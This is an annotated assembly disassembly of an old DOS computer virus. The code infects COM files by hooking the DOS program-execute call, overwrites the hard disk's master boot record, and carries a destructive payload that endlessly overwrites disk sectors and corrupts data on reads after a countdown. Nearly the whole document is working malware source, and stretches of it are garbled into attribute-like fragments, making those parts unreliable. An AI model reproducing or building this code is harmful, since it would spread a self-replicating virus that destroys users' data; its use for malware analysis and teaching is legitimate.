

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

	org	100h

start:	jmp	l_0CBD					;0100  E9 0BBA
d_0103	db	'J'					;0103  4A

;=============================================================
;	Victim code here
;-------------------------------------------------------------
	org	076Bh

;=============================================================
;	begin of virus code
;-------------------------------------------------------------

	;-------BOF pattern (jump into virus & contamination ptr)
	db	0E9h					;076B  E9
d_0101	dw	0682Ah		;jump distance		;076C  2A 68
	db	'J'					;076E  4A

;=============================================================
;	Partition table buffer (content not constant)
;-------------------------------------------------------------
r_0104:	jmp	short l_0775				;076F  EB 04
	db	 90h					;0771  90
	db	 'QQ'					;0772  51 51
	db	 64h					;0774  64
l_0775:	push	cs					;0775  0E
	pop	ax					;0776  58
	cmp	ax,0					;0777  3D 0000
	je	l_077F					;077A  74 03
	jmp	short l_07D2				;077C  EB 54
	db	90h					;077E  90
l_077F:	cmp	byte ptr cs:[7C05h],0			;077F  2E: 80 3E 7C05 00
	jne	l_0799					;0785  75 12
l_0787:	mov	ax,310h					;0787  B8 0310
	mov	cx,1					;078A  B9 0001
	mov	dx,80h					;078D  BA 0080
	mov	bx,0					;0790 .BB 0000
	int	13h					;0793  CD 13
	stc						;0795  F9
	cli						;0796  FA
	jc	l_0787					;0797  72 EE
l_0799:	xor	ax,ax					;0799  33 C0
	mov	es,ax					;079B  8E C0
	dec	byte ptr cs:[7C05h]			;079D  2E: FE 0E 7C05
	mov	ax,301h					;07A2  B8 0301
	mov	cx,1					;07A5  B9 0001
	mov	dx,80h					;07A8  BA 0080
	mov	bx,7C00h				;07AB .BB 7C00
	int	13h					;07AE  CD 13
	mov	ax,1000h				;07B0  B8 1000
	mov	es,ax					;07B3  8E C0
	mov	ax,0					;07B5  B8 0000
	mov	ds,ax					;07B8  8E D8
	mov	di,7C00h				;07BA .BF 7C00
	mov	si,di					;07BD  8B F7
	cld						;07BF  FC
	mov	cx,200h					;07C0  B9 0200
	rep	movsb					;07C3  F3/ A4
	mov	ax,1000h				;07C5  B8 1000
	push	ax					;07C8  50
	mov	ax,7C00h				;07C9  B8 7C00
	push	ax					;07CC  50
	mov	bp,sp					;07CD  8B EC
;*	jmp	dword ptr [bp]				;07CF  FF 6E 00
	db	0FFh, 6Eh, 00h				;07CF  FF 6E 00
l_07D2:	xor	ax,ax					;07D2  33 C0
	mov	ds,ax					;07D4  8E D8
	mov	ax,27Bh					;07D6  B8 027B
	mov	ds:[0413h],ax				;07D9  A3 0413
	mov	ax,9F00h				;07DC  B8 9F00
	mov	es,ax					;07DF  8E C0
	mov	bx,0100h				;07E1 .BB 0100
	mov	al,8					;07E4  B0 08
	mov	ah,2					;07E6  B4 02
	mov	ch,0					;07E8  B5 00
	mov	cl,3					;07EA  B1 03
	mov	dh,0					;07EC  B6 00
	mov	dl,80h					;07EE  B2 80
	int	13h					;07F0  CD 13
	xor	ax,ax					;07F2  33 C0
	mov	ds,ax					;07F4  8E D8
	mov	word ptr ds:[03D4h],'JM'		;07F6  C7 06 03D4 4A4D
	mov	ax,48Bh					;07FC  B8 048B
	mov	ds:[0070h],ax				;07FF  A3 0070
	mov	word ptr ds:[0072h],9F00h		;0802  C7 06 0072 9F00
	mov	ax,0					;0808  B8 0000
	mov	es,ax					;080B  8E C0
	mov	bx,7C00h				;080D .BB 7C00
	mov	ah,2					;0810  B4 02
	mov	al,1					;0812  B0 01
	mov	ch,0					;0814  B5 00
	mov	cl,2					;0816  B1 02
	mov	dh,0					;0818  B6 00
	mov	dl,80h					;081A  B2 80
	int	13h					;081C  CD 13
	xor	ax,ax					;081E  33 C0
	push	ax					;0820  50
	mov	ax,7C00h				;0821  B8 7C00
	push	ax					;0824  50
	mov	bp,sp					;0825  8B EC
;*	jmp	dword ptr [bp]		;*1 entry	;0827  FF 6E 00
	db	0FFh, 6Eh, 00h				;0827  FF 6E 00
	db	'. fixed disk.', 0Dh, 0Ah, 0Dh, 0Ah	;082A  2E 20 66 69 78 65
							;0830  64 20 64 69 73 6B
							;0836  2E 0D 0A 0D 0A
	db	'Insert COMPAQ DOS diskette in dr'	;083B  49 6E 73 65 72 74
							;0841  20 43 4F 4D 50 41
							;0847  51 20 44 4F 53 20
							;084D  64 69 73 6B 65 74
							;0853  74 65 20 69 6E 20
							;0859  64 72
	db	'ive A.', 0Dh, 0Ah, 'Press any ke'	;085B  69 76 65 20 41 2E
							;0861  0D 0A 50 72 65 73
							;0867  73 20 61 6E 79 20
							;086D  6B 65
	db	'y when ready: '			;086F  79 20 77 68 65 6E
							;0875  20 72 65 61 64 79
							;087B  3A 20
	db	7					;087D  07
	db	207 dup (0)				;087E  00CF[00]
	db	 80h, 01h, 01h, 00h, 04h, 06h		;094D  80 01 01 00 04 06
	db	 51h, 6Dh, 11h, 00h, 00h, 00h		;0953  51 6D 11 00 00 00
	db	 11h,0AAh, 00h, 00h, 00h, 00h		;0959  11 AA 00 00 00 00
	db	 41h, 6Eh, 04h, 06h, 91h,0DBh		;095F  41 6E 04 06 91 DB
	db	 22h,0AAh, 00h, 00h, 22h,0AAh		;0965  22 AA 00 00 22 AA
	db	 00h, 00h, 55h,0AAh			;096B  00 00 55 AA
;----------------------------------------------------------------
;	partition table buffer end
;----------------------------------------------------------------

r_0304	dw	 1460h		;int 21h offset		;096F  60 14
r_0306	dw	 0273h		;int 21h segment	;0971  73 02

r_0308	dw	 1DADh		;int 13h offset		;0973  AD 1D
r_030A	dw	 0070h		;int 13h segment	;0973  70 00

	db	 2Bh					;0977  2B

r_030D	db	 1		;desturction active if=0;0978  01
r_030E	dw	 0		;:= 0C8h - to activation;0979  00 00

r_0310	db	 0E9h,34h,05h,01h	;victim bytes	;097B  E9 34 05 01

r_0314	db	'Bad command or file name',0Dh,0Ah,'$'	;097F  42 61 64 20 63 6F
							;0985  6D 6D 61 6E 64 20
							;098B  6F 72 20 66 69 6C
							;0991  65 20 6E 61 6D 65
							;0997  0D 0A 24

d_032F	dw	 5		;file handle		;099A  05 00
d_0331	dw	 066Bh		;healthy file length	;099C  6B 06

;===============================================================
;	Is virus resident ?
;---------------------------------------------------------------
s_099E	proc	near
	push	ax					;099E  50
	push	ds					;099F  1E
	xor	ax,ax					;09A0  33 C0
	mov	ds,ax					;09A2  8E D8
	cmp	word ptr ds:[03D4h],'JM'    ;int F5h	;09A4  81 3E 03D4 4A4D
	je	l_09B0					;09AA  74 04
	clc			;<- not="" resident="" ;09ac="" f8="" jmp="" short="" l_09b1="" ;09ad="" eb="" 02="" db="" 90h="" ;09af="" 90="" l_09b0:="" stc=""></-><- yes,="" resident="" ;09b0="" f9="" l_09b1:="" pop="" ds="" ;09b1="" 1f="" pop="" ax="" ;09b2="" 58="" retn="" ;09b3="" c3="" s_099e="" endp="" ;="==============================================================" ;="" set="" infection="" flag="" ;---------------------------------------------------------------="" s_09b4="" proc="" near="" push="" ax="" ;09b4="" 50="" push="" ds="" ;09b5="" 1e="" xor="" ax,ax="" ;09b6="" 33="" c0="" mov="" ds,ax="" ;09b8="" 8e="" d8="" mov="" word="" ptr="" ds:[03d4h],'jm'="" ;09ba="" c7="" 06="" 03d4="" 4a4d="" pop="" ds="" ;09c0="" 1f="" pop="" ax="" ;09c1="" 58="" retn="" ;09c2="" c3="" s_09b4="" endp="" ;="==============================================================" ;="" contamine="" first="" hard="" disk="" drive="" ;---------------------------------------------------------------="" s_09c3="" proc="" near="" push="" ds="" ;09c3="" 1e="" push="" es="" ;09c4="" 06="" push="" cs="" ;09c5="" 0e="" pop="" ds="" ;09c6="" 1f="" mov="" ah,2="" ;read="" ;09c7="" b4="" 02="" mov="" al,1="" ;1="" sector="" ;09c9="" b0="" 01="" mov="" ch,0="" ;track="" 0="" ;09cb="" b5="" 00="" mov="" cl,1="" ;sector="" 1="" ;09cd="" b1="" 01="" mov="" dh,0="" ;head="" 0="" ;09cf="" b6="" 00="" mov="" dl,80h="" ;first="" hard="" disk="" drive="" ;09d1="" b2="" 80="" push="" cs="" ;09d3="" 0e="" pop="" es="" ;09d4="" 07="" mov="" bx,0104h="" ;="l_076F" ;09d5="" .bb="" 0104="" int="" 13h="" ;09d8="" cd="" 13="" cmp="" cs:[0107h],'qq'="" ;contamination="" signature;09da="" 2e:="" 81="" 3e="" 0107="" 5151="" je="" l_0a38="" ;-=""> allready infected	;09E1  74 55

				;<- destruction="" variable="" initiation="" mov="" word="" ptr="" cs:[30eh],0c8h="" ;="l_0979" count="" ;09e3="" 2e:="" c7="" 06="" 030e="" 00c8="" mov="" byte="" ptr="" cs:[30dh],1="" ;="l_0978" off="" ;09ea="" 2e:="" c6="" 06="" 030d="" 01="" mov="" byte="" ptr="" cs:[3d5h],64h="" ;="l_0A40" count="" ;09f0="" 2e:="" c6="" 06="" 03d5="" 64=""></-><- save="" oryginal="" mov="" ah,3="" ;write="" ;09f6="" b4="" 03="" mov="" al,1="" ;1="" sector="" ;09f8="" b0="" 01="" mov="" ch,0="" ;track="" 0="" ;09fa="" b5="" 00="" mov="" cl,2="" ;sector="" 2="" ;09fc="" b1="" 02="" mov="" dh,0="" ;head="" 0="" ;09fe="" b6="" 00="" mov="" dl,80h="" ;1="" hd="" drive="" ;0a00="" b2="" 80="" mov="" bx,104h="" ;="offset" l_076f="" ;0a02="" .bb="" 0104="" int="" 13h="" ;0a05="" cd="" 13=""></-><- make="" new="" master="" boot="" record="" mov="" cx,0bbh="" ;constant="" part="" length="" ;0a07="" b9="" 00bb="" inc="" cx="" ;0a0a="" 41="" mov="" si,3d0h="" ;="offset" l_0a3b="" ;0a0b="" .be="" 03d0="" mov="" di,104h="" ;="offset" l_076f="" ;0a0e="" .bf="" 0104="" cld="" ;0a11="" fc="" rep="" movsb="" ;0a12="" f3/="" a4="" mov="" ah,3="" ;write="" ;0a14="" b4="" 03="" mov="" al,1="" ;1="" sector="" ;0a16="" b0="" 01="" mov="" ch,0="" ;track="" 0="" ;0a18="" b5="" 00="" mov="" cl,1="" ;sector="" 1="" ;0a1a="" b1="" 01="" mov="" dh,0="" ;head="" 0="" ;0a1c="" b6="" 00="" mov="" dl,80h="" ;1-st="" hd="" drive="" ;0a1e="" b2="" 80="" mov="" bx,0104h="" ;="offset" l_076f="" ;0a20="" .bb="" 0104="" int="" 13h="" ;0a23="" cd="" 13=""></-><- write="" rest="" of="" virus="" code="" mov="" al,8="" ;8="" sectors="" ;0a25="" b0="" 08="" mov="" ah,3="" ;write="" ;0a27="" b4="" 03="" mov="" ch,0="" ;track="" 0="" ;0a29="" b5="" 00="" mov="" cl,3="" ;sector="" 3="" ;0a2b="" b1="" 03="" mov="" dh,0="" ;head="" 0="" ;0a2d="" b6="" 00="" mov="" dl,80h="" ;1-st="" hd="" drive="" ;0a2f="" b2="" 80="" mov="" bx,100h="" ;="offset" l076b="" ;0a31="" .bb="" 0100="" push="" cs="" ;0a34="" 0e="" pop="" es="" ;0a35="" 07="" int="" 13h="" ;0a36="" cd="" 13=""></-><-- partition="" table="" allready="" infected="" l_0a38:="" pop="" es="" ;0a38="" 07="" pop="" ds="" ;0a39="" 1f="" retn="" ;0a3a="" c3="" s_09c3="" endp="" ;="===============================================================" ;="" master="" boot="" record="" code="" pattern="" ;----------------------------------------------------------------="" jmp="" short="" l_0a41="" ;0a3b="" eb="" 04="" nop="" ;0a3d="" 90="" db="" 'qq'="" ;contamination="" sygnature;0a3e="" 51="" 51="" r_03d5="" db="" 64h="" ;reboot="" count="" to="" destr.="" ;0a40="" 64="" l_0a41:="" push="" cs="" ;0a41="" 0e="" pop="" ax="" ;0a42="" 58="" cmp="" ax,0="" ;0a43="" 3d="" 0000="" je="" l_0a4b="" ;0a46="" 74="" 03="" jmp="" short="" l_0a9e="" ;0a48="" eb="" 54="" nop="" ;0a4a="" 90=""></--><- code="" to="" make="" destruction="" l_0a4b:="" cmp="" byte="" ptr="" cs:[7c05h],0="" ;="r_0305" ;0a4b="" 2e:="" 80="" 3e="" 7c05="" 00="" jne="" l_0a65="" ;-=""> counter not exhaused;0A51  75 12

l_0A53:	mov	ax,0310h	;write 16 sectors	;0A53  B8 0310
	mov	cx,1		;track 0, sector 0	;0A56  B9 0001
	mov	dx,80h		;head 0, HDD 0		;0A59  BA 0080
	mov	bx,0		;buffer			;0A5C .BB 0000
	int	13h					;0A5F  CD 13
	stc						;0A61  F9
	cli						;0A62  FA
	jc	l_0A53		;endless loop		;0A63  72 EE

l_0A65:	xor	ax,ax					;0A65  33 C0
	mov	es,ax					;0A67  8E C0
	dec	byte ptr cs:[7C05h]	;reboot counter	;0A69  2E: FE 0E 7C05
	mov	ax,301h		;write counter to disk	;0A6E  B8 0301
	mov	cx,1					;0A71  B9 0001
	mov	dx,80h					;0A74  BA 0080
	mov	bx,7C00h				;0A77 .BB 7C00
	int	13h					;0A7A  CD 13

	mov	ax,1000h	;make virus boot copy	;0A7C  B8 1000
	mov	es,ax					;0A7F  8E C0
	mov	ax,0					;0A81  B8 0000
	mov	ds,ax					;0A84  8E D8
	mov	di,7C00h				;0A86 .BF 7C00
	mov	si,di					;0A89  8B F7
	cld						;0A8B  FC
	mov	cx,200h					;0A8C  B9 0200
	rep	movsb					;0A8F  F3/ A4
	mov	ax,1000h				;0A91  B8 1000
	push	ax					;0A94  50
	mov	ax,7C00h				;0A95  B8 7C00
	push	ax					;0A98  50
	mov	bp,sp					;0A99  8B EC
	jmp	dword ptr [bp]	;run boot code again	;0A9B  FF 6E 00

l_0A9E:	xor	ax,ax					;0A9E  33 C0
	mov	ds,ax					;0AA0  8E D8
	mov	ax,27Bh		;= 635			;0AA2  B8 027B
	mov	ds:[0413h],ax	;BIOS memory size	;0AA5  A3 0413
	mov	ax,9F00h				;0AA8  B8 9F00
	mov	es,ax					;0AAB  8E C0
	mov	bx,0100h	;virus offset		;0AAD .BB 0100
	mov	al,8		;8 sectors		;0AB0  B0 08
	mov	ah,2		;read			;0AB2  B4 02
	mov	ch,0		;track			;0AB4  B5 00
	mov	cl,3		;sector			;0AB6  B1 03
	mov	dh,0		;head			;0AB8  B6 00
	mov	dl,80h		;hdd nr 0		;0ABA  B2 80
	int	13h					;0ABC  CD 13

	xor	ax,ax					;0ABE  33 C0
	mov	ds,ax					;0AC0  8E D8
	mov	word ptr ds:[03D4h],'JM' ;virus sign.	;0AC2  C7 06 03D4 4A4D
	mov	ax,48Bh					;0AC8  B8 048B
	mov	ds:[0070h],ax		 ;int 1Ch offs	;0ACB  A3 0070
	mov	word ptr ds:[0072h],9F00h;int 1Ch seg	;0ACE  C7 06 0072 9F00
	mov	ax,0					;0AD4  B8 0000
	mov	es,ax					;0AD7  8E C0
	mov	bx,7C00h	;oryg.boot buffer	;0AD9 .BB 7C00
	mov	ah,2		;read			;0ADC  B4 02
	mov	al,1		;1 sector		;0ADE  B0 01
	mov	ch,0		;track=0		;0AE0  B5 00
	mov	cl,2		;oryg. boot sector = 2	;0AE2  B1 02
	mov	dh,0		;head			;0AE4  B6 00
	mov	dl,80h		;drive			;0AE6  B2 80
	int	13h					;0AE8  CD 13

	xor	ax,ax					;0AEA  33 C0
	push	ax					;0AEC  50
	mov	ax,7C00h				;0AED  B8 7C00
	push	ax					;0AF0  50
	mov	bp,sp					;0AF1  8B EC
	jmp	dword ptr [bp]				;0AF3  FF 6E 00
;-------End of MBR pattern

;================================================================
;	int 1Ch handling routine (wait until DOS establishing vectors)
;----------------------------------------------------------------
	cmp	word ptr cs:[30Eh],0			;0AF6  2E: 83 3E 030E 00
	jne	l_0AFF					;0AFC  75 01
	iret						;0AFE  CF

l_0AFF:	push	ax					;0AFF  50
	push	ds					;0B00  1E
	xor	ax,ax					;0B01  33 C0
	mov	ds,ax					;0B03  8E D8
	mov	word ptr ds:[03D4h],'JM'		;0B05  C7 06 03D4 4A4D
	dec	word ptr cs:[30Eh]			;0B0B  2E: FF 0E 030E
	cmp	word ptr cs:[30Eh],0	;counter to dest;0B10  2E: 83 3E 030E 00
	jne	l_0B54					;0B16  75 3C
	cli						;0B18  FA
	mov	byte ptr cs:[30Dh],0	;destruct.active;0B19  2E: C6 06 030D 00
	xor	ax,ax					;0B1F  33 C0
	mov	ds,ax					;0B21  8E D8
	mov	ax,ds:[084h]		;int 21h offset	;0B23  A1 0084
	mov	word ptr cs:[304h],ax			;0B26  2E: A3 0304
	mov	ax,ds:[086h]		;int 21h segment;0B2A  A1 0086
	mov	word ptr cs:[306h],ax			;0B2D  2E: A3 0306
	mov	ax,ds:[04Ch]		;int 13h offset	;0B31  A1 004C
	mov	word ptr cs:[308h],ax			;0B34  2E: A3 0308
	mov	ax,ds:[04Eh]		;int 13h segment;0B38  A1 004E
	mov	word ptr cs:[30Ah],ax			;0B3B  2E: A3 030A
					;<- int="" 21h="" mov="" word="" ptr="" ds:[084h],51bh="" ;l_0b86="offset;0B3F" c7="" 06="" 0084="" 051b="" mov="" ds:[086h],cs="" ;="" segment;0b45="" 8c="" 0e="" 0086=""></-><- int="" 13h="" mov="" word="" ptr="" ds:[04ch],4ech="" ;l_0b57="offset;0B49" c7="" 06="" 004c="" 04ec="" mov="" ds:[04eh],cs="" ;="" segment;0b4f="" 8c="" 0e="" 004e="" sti="" ;0b53="" fb="" l_0b54:="" pop="" ds="" ;0b54="" 1f="" pop="" ax="" ;0b55="" 58="" iret="" ;0b56="" cf="" ;="==============================================================" ;="" int="" 13="" handling="" routine="" -="" sector="" destruction="" ;---------------------------------------------------------------="" cmp="" byte="" ptr="" cs:[030dh],1="" ;disable="" ;0b57="" 2e803e0d0301="" jz="" l_0b81="" ;-=""> yes		;0B5D 7422
	CMP     AH,2					;0B5F 80FC02
	JNZ     l_0B81					;0B62 751D
	INC     BYTE PTR cs:[030Ch]	;interval 256	;0B64 2EFE060C03
	CMP     BYTE PTR cs:[030Ch],00			;0B69 2E803E0C0300
	JNZ     l_0B81			;->still waiting;0B6F 7510
	PUSHF						;0B71 9C
	CALL    dword ptr cs:[0308h]		;int 13h;0B72 2EFF1E0803
	MOV     WORD PTR es:[BX+00C8h],'jm'	;destr.	;0B77 26C787C8006D6A
	RETF    2					;0B7E CA0200

l_0B81:	JMP     dword ptr cs:[0308h]		;int 13h;0B81 2EFF2E0803

;===============================================================
;	Int 21h service routine
;---------------------------------------------------------------
r_051B:	CMP     AX,4B00h				;0B86 3D004B
	JZ      l_0B8E					;0B89 7403
	JMP     l_0C5F		;-> oryginal service	;0B8B E9D100

			;<- run="" program,="" contamine="" before="" l_0b8e:="" push="" ax="" ;0b8e="" 50="" push="" bx="" ;0b8f="" 53="" push="" cx="" ;0b90="" 51="" push="" dx="" ;0b91="" 52="" push="" bp="" ;0b92="" 55="" push="" di="" ;0b93="" 57="" push="" si="" ;0b94="" 56="" push="" ds="" ;0b95="" 1e="" push="" es="" ;0b96="" 06="" call="" s_0c64="" ;check="" type="" of="" victim="" ;0b97="" e8="" 00ca="" jnc="" l_0b9f="" ;-=""> COM			;0B9A  73 03
	jmp	l_0C50		;-> not COM		;0B9C  E9 00B1

l_0B9F:	mov	ax,4301h	;set file attribute	;0B9F  B8 4301
	mov	cx,0		;no atributtes		;0BA2  B9 0000
	int	21h					;0BA5  CD 21

	mov	byte ptr cs:[30Dh],1	;no destruction	;0BA7  2E: C6 06 030D 01
	mov	ah,3Dh		;open file		;0BAD  B4 3D
	mov	al,2		;read/write		;0BAF  B0 02
	int	21h					;0BB1  CD 21

	jnc	l_0BB8		;-> O.K.		;0BB3  73 03
	jmp	l_0C50		;-> error, exit		;0BB5  E9 0098

l_0BB8:	mov	word ptr cs:[32Fh],ax	;file handle	;0BB8  2E: A3 032F
	call	s_0C7F		;check if file infected	;0BBC  E8 00C0
	jnc	l_0BC4		;-> no			;0BBF  73 03
	jmp	l_0C47		;-> yes			;0BC1  E9 0083

l_0BC4:	xor	cx,cx		;offset := 0		;0BC4  33 C9
	mov	dx,cx					;0BC6  8B D1
	mov	ax,4200h	;move file ptr BOF+offs	;0BC8  B8 4200
	mov	bx,word ptr cs:[32Fh]	;file handle	;0BCB  2E: 8B 1E 032F
	int	21h					;0BD0  CD 21

	mov	cx,4			;4 bytes	;0BD2  B9 0004
	mov	bx,word ptr cs:[32Fh]	;file handle	;0BD5  2E: 8B 1E 032F
	mov	dx,310h			;L097B = safes	;0BDA .BA 0310
	mov	ah,3Fh			;read file	;0BDD  B4 3F
	push	cs					;0BDF  0E
	pop	ds					;0BE0  1F
	int	21h					;0BE1  CD 21

	jnc	l_0BE8			;-> O.K.	;0BE3  73 03
	jmp	short l_0C47		;-> ERROR	;0BE5  EB 60
	nop						;0BE7  90

l_0BE8:	mov	ax,4202h		;file ptr EOF+of;0BE8  B8 4202
	mov	bx,word ptr cs:[32Fh]	;file handle	;0BEB  2E: 8B 1E 032F
	xor	cx,cx			;offset=0	;0BF0  33 C9
	xor	dx,dx					;0BF2  33 D2
	int	21h					;0BF4  CD 21

	mov	word ptr cs:[331h],ax	;L099C = file l.;0BF6  2E: A3 0331
	cmp	dx,0			;high order word;0BFA  83 FA 00
	je	l_0C02			;-> LT 64K bytes;0BFD  74 03
	jmp	short l_0C47		;-> file too big;0BFF  EB 46
	nop						;0C01  90

l_0C02:	and	ah,7Fh		;???			;0C02  80 E4 7F
	cmp	ax,32h		;minimum file size	;0C05  3D 0032
	jg	l_0C0D		;-> O.K.		;0C08  7F 03
	jmp	short l_0C47	;-> too small		;0C0A  EB 3B
	nop						;0C0C  90

l_0C0D:	mov	ah,40h		;file write		;0C0D  B4 40
	mov	bx,word ptr cs:[32Fh]	;file handle	;0C0F  2E: 8B 1E 032F
	mov	cx,5E9h		;virus length		;0C14  B9 05E9
	push	cs					;0C17  0E
	pop	ds		;virus segment		;0C18  1F
	mov	dx,100h		;virus offset		;0C19 .BA 0100
	int	21h					;0C1C  CD 21

	mov	ax,word ptr cs:[331h]	;file length	;0C1E  2E: A1 0331
	add	ax,54Fh			;(+3 = L0CBD)	;0C22  05 054F
	mov	word ptr cs:[101h],ax			;0C25  2E: A3 0101
	xor	cx,cx			;offset := 0	;0C29  33 C9
	xor	dx,dx					;0C2B  33 D2
	mov	al,0			;BOF + offset	;0C2D  B0 00
	mov	ah,42h			;set file ptr	;0C2F  B4 42
	mov	bx,word ptr cs:[32Fh]	;file handle	;0C31  2E: 8B 1E 032F
	int	21h					;0C36  CD 21

	mov	cx,4			;4 bytes	;0C38  B9 0004
	mov	ah,40h			;write file	;0C3B  B4 40
	mov	bx,word ptr cs:[32Fh]	;file handle	;0C3D  2E: 8B 1E 032F
	mov	dx,100h			;virus start cod;0C42 .BA 0100
	int	21h					;0C45  CD 21

			;<- contamination="" error="" entry="" l_0c47:="" mov="" bx,word="" ptr="" cs:[32fh]="" ;file="" handle="" ;0c47="" 2e:="" 8b="" 1e="" 032f="" mov="" ah,3eh="" ;close="" file="" ;0c4c="" b4="" 3e="" int="" 21h="" ;0c4e="" cd="" 21=""></-><-- file="" not="" infectable="" or="" end="" of="" infection="" l_0c50:="" mov="" byte="" ptr="" cs:[30dh],0="" ;enable="" destruct;0c50="" 2e:="" c6="" 06="" 030d="" 00="" pop="" es="" ;0c56="" 07="" pop="" ds="" ;0c57="" 1f="" pop="" si="" ;0c58="" 5e="" pop="" di="" ;0c59="" 5f="" pop="" bp="" ;0c5a="" 5d="" pop="" dx="" ;0c5b="" 5a="" pop="" cx="" ;0c5c="" 59="" pop="" bx="" ;0c5d="" 5b="" pop="" ax="" ;0c5e="" 58="" l_0c5f:="" jmp="" dword="" ptr="" cs:[304h]="" ;oryg.="" int="" 21h="" ;0c5f="" 2e:="" ff="" 2e="" 0304="" ;="======================================================" ;="" subroutine="" -="" check="" type="" of="" victim="" ;-------------------------------------------------------="" s_0c64="" proc="" near="" push="" ax="" ;0c64="" 50="" push="" bx="" ;0c65="" 53="" mov="" bx,dx="" ;victim="" name="" offset="" ;0c66="" 8b="" da="" mov="" al,0="" ;end="" of="" path="" char="" ;0c68="" b0="" 00="" l_0c6a:="" inc="" bx="" ;0c6a="" 43="" cmp="" [bx],al="" ;0c6b="" 38="" 07="" jne="" l_0c6a="" ;0c6d="" 75="" fb="" mov="" ax,4d4fh="" ;'mo'-="" last="" com="" letters="" ;0c6f="" b8="" 4d4f="" cmp="" [bx-2],ax="" ;0c72="" 39="" 47="" fe="" je="" l_0c7b="" ;-=""> it's COM		;0C75  74 04
	stc			;'not infectable' - ptr	;0C77  F9
	jmp	short l_0C7C				;0C78  EB 02
	db	90h					;0C7A  90
l_0C7B:	clc			;'infectable' - ptr	;0C7B  F8
l_0C7C:	pop	bx					;0C7C  5B
	pop	ax					;0C7D  58
	retn						;0C7E  C3
s_0C64	endp

;=======================================================
;	Subroutine - check if file infected
;-------------------------------------------------------
s_0C7F	proc	near
	jmp	short l_0C83				;0C7F  EB 02
	nop						;0C81  90

d_0C82	db	1		;1 char file buffer	;0C82  01

l_0C83:	push	ax					;0C83  50
	push	bx					;0C84  53
	push	cx					;0C85  51
	push	dx					;0C86  52
	push	es					;0C87  06
	push	ds					;0C88  1E
	push	cs					;0C89  0E
	pop	ds					;0C8A  1F
	mov	ax,4200h	;move file ptr BOF+offs	;0C8B  B8 4200
	mov	bx,word ptr cs:[32Fh]	;file handle	;0C8E  2E: 8B 1E 032F
	xor	cx,cx					;0C93  33 C9
	mov	dx,3		;0:3			;0C95  BA 0003
	int	21h					;0C98  CD 21

	mov	ah,3Fh		;read			;0C9A  B4 3F
	mov	cx,1		;1 byte			;0C9C  B9 0001
	mov	bx,word ptr cs:[32Fh]	;file handle	;0C9F  2E: 8B 1E 032F
	mov	dx,0617h	;L_0C82 =file buffer	;0CA4 .BA 0617
	int	21h					;0CA7  CD 21

	cmp	byte ptr cs:[617h],'J'	;infection ptr	;0CA9  2E: 80 3E 0617 4A
	je	l_0CB5		;-> allready infected	;0CAF  74 04
	clc						;0CB1  F8
	jmp	short l_0CB6	;-> ready to infection	;0CB2  EB 02
	nop						;0CB4  90

l_0CB5:	stc			;<- infected="" ;0cb5="" f9="" l_0cb6:="" pop="" es="" ;0cb6="" 07="" pop="" ds="" ;0cb7="" 1f="" pop="" dx="" ;0cb8="" 5a="" pop="" cx="" ;0cb9="" 59="" pop="" bx="" ;0cba="" 5b="" pop="" ax="" ;0cbb="" 58="" retn="" ;0cbc="" c3="" s_0c7f="" endp="" ;="======================================================" ;="" virus="" entry="" point="" ;-------------------------------------------------------="" l_0cbd:="" call="" s_099e="" ;is="" virus="" resident="" ;0cbd="" e8="" fcde="" jnc="" l_0ce0="" ;-=""> no			;0CC0  73 1E

				;<- run="" victim="" mov="" cx,4="" ;changed="" bytes="" count="" ;0cc2="" b9="" 0004="" cld="" ;0cc5="" fc="" mov="" di,100h="" ;address="" ;0cc6="" .bf="" 0100="" call="" s_0ccc="" ;0cc9="" e8="" 0000="" ;------="" restore="" victim="" byte="" s_0ccc="" proc="" near="" pop="" bp="" ;0ccc="" 5d="" sub="" bp,661h="" ;l_066b="virus" begin-100h;0ccd="" 81="" ed="" 0661="" lea="" si,[bp+310h]="" ;l_097b="" ;0cd1="" 8d="" b6="" 0310="" cld="" ;0cd5="" fc="" rep="" movsb="" ;0cd6="" f3/="" a4="" push="" cs="" ;0cd8="" 0e="" mov="" ax,offset="" start="" ;0cd9="" .b8="" 0100="" push="" ax="" ;0cdc="" 50="" retn="" 0fffeh="" ;0cdd="" c2="" fffe="" s_0ccc="" endp=""></-><- virus="" not="" resident="" yet="" l_0ce0:="" call="" s_0ce3="" ;0ce0="" e8="" 0000="" ;------="" make="" virus="" resident="" s_0ce3="" proc="" near="" pop="" bp="" ;0ce3="" 5d="" sub="" bp,678h="" ;="066Bh" =="" vir_beg-100h="" ;0ce4="" 81="" ed="" 0678="" push="" cs="" ;0ce8="" 0e="" pop="" ds="" ;0ce9="" 1f="" push="" cs="" ;0cea="" 0e="" pop="" es="" ;0ceb="" 07="" mov="" di,100h="" ;0cec="" .bf="" 0100="" lea="" si,[bp+100h]="" ;virus="" code="" begin="" ;0cef="" 8d="" b6="" 0100="" cld="" ;0cf3="" fc="" mov="" cx,5e9h="" ;virus="" length="" ;0cf4="" b9="" 05e9="" rep="" movsb="" ;overwrite="" victim="" code="" ;0cf7="" f3/="" a4="" mov="" ax,0693h="" ;="l_0CFB" ;0cf9="" .b8="" 0693="" push="" ax="" ;0cfc="" 50="" retn="" ;0cfd="" c3="" s_0ce3="" endp="" ;---------------------------------------------------------------="" ;="" run="" in="" new="" place="" ;---------------------------------------------------------------="" r_0693:="" mov="" dx,0314h="" ;="l_097F" (bad="" command..);0cfe="" ba1403="" mov="" ah,9="" ;display="" string="" ;0d01="" b409="" int="" 21h="" ;0d03="" cd21="" push="" cs="" ;0d05="" 0e="" pop="" ds="" ;0d06="" 1f="" mov="" ax,3521h="" ;get="" int="" 21h="" ;0d07="" b82135="" int="" 21h="" ;0d0a="" cd21="" mov="" cs:[0304h],bx="" ;="l_096F" ;0d0c="" 2e891e0403="" mov="" cs:[0306h],es="" ;="l_0971" ;0d11="" 2e8c060603="" cli="" ;0d16="" fa="" xor="" ax,ax="" ;0d17="" 33c0="" mov="" ds,ax="" ;0d19="" 8ed8="" mov="" ds:[86h],cs="" ;int="" 21h="" segment="" ;0d1b="" 8c0e8600="" mov="" ax,051bh="" ;="l_0B86" ;0d1f="" b81b05="" mov="" ds:[84h],ax="" ;int="" 21h="" offset="" ;0d22="" a38400="" sti="" ;0d25="" fb="" call="" s_09b4="" ;set="" infection="" flag="" ;0d26="" e88bfc="" call="" s_09c3="" ;contamine="" hard="" disk="" ;0d29="" e897fc="" push="" cs="" ;0d2c="" 0e="" pop="" ds="" ;0d2d="" 1f="" mov="" ax,3513h="" ;get="" int="" 13h="" vector="" ;0d2e="" b81335="" int="" 21h="" ;0d31="" cd21="" mov="" cs:[0308h],bx="" ;="l_0973" ;0d33="" 